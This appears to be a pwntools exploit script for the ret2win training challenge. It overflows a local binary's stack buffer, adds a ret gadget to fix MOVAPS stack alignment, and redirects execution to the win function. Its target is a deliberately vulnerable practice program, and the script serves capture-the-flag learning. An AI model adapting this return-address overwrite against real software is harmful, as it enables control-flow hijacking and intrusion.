from pwn import *

p = process('./ret2win')
#pid = gdb.attach(p)

# Address to ret2win function
addr_ret2win = 0x400756

# added a ret the MOVAPS issue
ret = 0x40053e

payload = b'A'*32 + b'B'*8 + p64(ret) +  p64(addr_ret2win)

p.writeafter(">", payload)

info(p.clean().decode())

